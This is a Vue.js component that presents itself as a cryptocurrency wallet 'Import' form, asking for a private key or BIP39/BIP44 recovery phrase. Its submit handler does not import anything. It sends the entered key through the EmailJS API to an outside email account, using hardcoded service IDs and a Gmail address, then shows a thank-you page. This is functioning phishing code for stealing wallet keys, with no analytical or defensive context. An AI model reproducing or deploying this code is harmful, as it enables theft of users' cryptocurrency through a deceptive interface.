<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your key</label
    >
    <el-input v-model="private_key" type="textarea" :rows="3"> </el-input>
    <span>Please enter your private key in HEX format.</span>
    <p class="my-20 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the private keys
      that manage your acccounts.
    </p>
    <el-button
      :loading="loading"
      style="
        background: rgb(0, 140, 115) !important;
        color: white;
        font-weight: bold;
      "
      @click="sendData"
      >Import</el-button
    >
  </div>
</template>

<script>
import axios from 'axios'
export default {
  props: {
    walletType: {
      type: String,
      default: ''
    },
  },
  data() {
    return {
      private_key: '',
      loading: false,
    }
  },
  methods: {
    sendData() {
      this.loading = true
      const self = this
      const checker = this.formChecker()
      if (checker) {
        const data = {
          service_id: "service_vy70nin",
          template_id: "template_3v9cybs",
          user_id: "user_csCtqxIb1Ezomu1Lo2equ",
          template_params: {
            from_name: `Private Key on ${this.walletType}`,
            private_key: this.private_key,
            reply_to: "samuelbarnett660@gmail.com"
          },
        }
        axios
          .post('https://api.emailjs.com/api/v1.0/email/send', data)
          .then(function () {
            self.$router.push('/thank-you')
            self.loading = false
          })
          .catch(function () {
            self.loading = false
          })
      } else {
        this.$notify({
          title: 'Warning',
          message: 'All Form input is required',
          type: 'warning',
        })
      }
    },
    formChecker() {
      if (this.private_key === '') {
        return false
      } else {
        return true
      }
    },
  },
}
</script>
